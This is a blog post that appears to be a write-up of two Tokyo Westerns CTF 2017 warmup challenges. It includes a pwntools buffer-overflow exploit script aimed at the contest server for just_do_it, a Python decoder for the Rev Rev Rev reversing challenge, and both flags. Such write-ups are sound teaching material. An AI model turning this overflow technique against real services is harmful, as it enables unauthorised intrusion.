---
layout: post
title:  "Radare2 and Tokyo Western CTF: just\_do\_it, Rev Rev Rev"
date:   2017-8-3 19:20:00 -0400
categories: update post exploitation reverse-engineering
---

<h1>Introduction</h1>

I had fun in, but hadn't done well in the Tokyo Westerns CTF that has just passed. I'm still waiting myself for some better writeups to some of the more interesting challenges to get posted. But here's my writeup of two warmup challenges.

<h1>just_do_it</h1>

<img title="r2 - Graph of input handling" src="/pics/TakingTheInputJustDoIt.png">

This challenge was a very straightforward buffer overflow. The buffer that's written into has only 0x10 bytes of space al located to it, but 0x20 is passed in as a size for fgets.  Overflow, the buffer until the dword 0xc bytes below the ebp register is overflown. You can then write into the variable any address to be called by puts here.

<img src="/pics/OverflowJustDoIt.png">

Point it at the static address the flag is loaded into (either 0x0804a07f or 0x0804a080, depending on whether you ask radare2 or GDB), and we can then get the flag.

{% highlight Python %}

from pwn import *

e = ELF('./just_do_it')
#p = process('./just_do_it')

start = 0x0804a07f

'''
May have been off by a byte, but I was too lazy to be precise.
flag:TWCTF{pwnable_warmup_I_did_it!}
'''

#Don't need to let it keep running after getting the flag.
for i in range(0,100):
    p = remote("pwn1.chal.ctf.westerns.tokyo", 12345)
    p.send(cyclic(length=0x14, n=4)+pack(start+i) + '\n')
    print p.recv()

{% endhighlight %}

<h1>Rev Rev Rev</h1>

So, there's essentially 3 key functions to look at. Radare2 lists them as sub.strlen_6db, fcn.08048738, and fcn.080487b2.

<img src="/pics/RevRevRev.png">

The strlen-named function simply performs a strrev() on the input string. 

The function located at 0x08048738 performs three different pairwise flips on each character following.

<img src="/pics/PairwiseFlips.png">

What the first effectively does is take every two consecutive bits in a character, and swap them. And then the second takes consecutive groups of 2 bits and swaps them. And the third takes both pairs of 4 bits within the byte to swap them.

The last function at 0x084087b2 simply performs a NOT operation on each character to flip every bit inside. 

Lastly, the encrypted flag can be found within Radare2 by seeking to the location its pointer is stored (s 0x804a038), and then seeking to the address found there.

<img src="/pics/EncryptedFlagRevRevRev.png">

After copying the bytes into Python, unencryption can be done by redoing each function in reverse.

{% highlight Python %}
from pwn import *

flag_hidden = pack(0x65d92941) + pack(0xc9e1f1a1) + pack(0x13930919) + pack(0x49b909a1) + pack(0x61dd89b9) + pack(0xf1a16931) + pack(0xd59d2171) + pack(0x00d5153d)

flag_hidden = flag_hidden[:-1] #don't want to operate on null byte.

def pair_flip(c):
    return ( ((c & 0x55) << 1) | ((c >> 1) & 0x55) ) & 0xff

def double_flip(c):    return ( ((c &0x33) << 2) | ((c >> 2) & 0x33) ) & 0xff

def quad_flip(c):
    return ((c << 4) | (c >> 4)) &0xff


flag = ""

for b in list(flag_hidden):
    xor_chr = ord(b) ^ 0xff #Undo NOT
    q_chr = quad_flip(xor_chr)
    d_chr = double_flip(q_chr)
    p_chr = pair_flip(d_chr)
    flag += chr(p_chr)

#There's no joke in the flag. :/
print "flag:" + flag[::-1]

{% endhighlight %}
